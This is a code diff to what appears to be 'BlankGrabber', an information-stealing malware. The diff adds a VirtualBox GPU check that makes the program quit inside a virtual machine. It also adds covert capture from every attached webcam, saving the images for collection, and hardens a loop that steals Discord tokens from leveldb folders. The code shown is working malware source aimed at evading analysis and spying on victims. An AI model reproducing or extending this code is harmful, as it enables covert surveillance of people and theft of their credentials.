@@ -114,7 +114,8 @@ class vmprotect:
         
         r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
         r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
-        if r1.returncode != 1 and r2.returncode != 1:
+        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox"))
+        if (r1.returncode != 1 and r2.returncode != 1) or gpucheck:
             fquit()
         
         for p in ("D:\\Tools", "D:\\OS2", "D:\\NT3X"):
@@ -213,17 +214,21 @@ class BlankGrabber:
         call = subprocess.run("a.es -d -p blank cm.bam.aes", capture_output= True, shell= True, cwd= sys._MEIPASS)
         if call.returncode != 0:
             return
-        subprocess.run("cm.bam /filename Webcam.bmp", capture_output= True, shell= True, cwd= sys._MEIPASS)
-        if not os.path.isfile(os.path.join(sys._MEIPASS, "Webcam.bmp")):
-            return
-        if is_monochrome(os.path.join(sys._MEIPASS, "Webcam.bmp")):
-            os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
-            return
-        with Image.open(os.path.join(sys._MEIPASS, "Webcam.bmp")) as img:
-            img.save(os.path.join(self.tempfolder, "Webcam.png"), "png")
-        os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
+
+        camlist = [x[15:] for x in force_decode(subprocess.run("cm.bam /devlist", capture_output= True, cwd= sys._MEIPASS, shell= True).stdout).splitlines() if "Device name:" in x]
+        for name in camlist:
+            subprocess.run(f'cm.bam /devname "{name}" /filename webcam.bmp', capture_output= True, shell= True, cwd= sys._MEIPASS) #A little bit glitchy (sometime captures the same webcam if No. of webcams > 1)
+            if not os.path.isfile(os.path.join(sys._MEIPASS, "webcam.bmp")):
+                continue
+            if is_monochrome(os.path.join(sys._MEIPASS, "webcam.bmp")):
+                os.remove(os.path.join(sys._MEIPASS, "webcam.bmp"))
+                continue
+            os.makedirs(webcamfolder := os.path.join(self.tempfolder, "Camera"), exist_ok= True)
+            with Image.open(os.path.join(sys._MEIPASS, "webcam.bmp")) as img:
+                img.save(os.path.join(webcamfolder, f"{name}.png"), "png")
+            os.remove(os.path.join(sys._MEIPASS, "webcam.bmp"))
+            self.grabbed_data["Webcam"] += 1
         os.remove(os.path.join(sys._MEIPASS, "cm.bam"))
-        self.grabbed_data["Webcam"] += 1
 
     @catch
     def copy(self, source, destination):
@@ -495,6 +500,8 @@ class BlankGrabber:
                 t.start()
                 nextPaths = force_decode(subprocess.run("dir leveldb /AD /s /b", capture_output= True, shell= True, cwd= path[1]).stdout).strip().splitlines()
                 for path in nextPaths:
+                    if not os.path.exists(path):
+                        continue
                     t = threading.Thread(target= lambda: grabcord(path))
                     token_threads.append(t)
                     t.start()
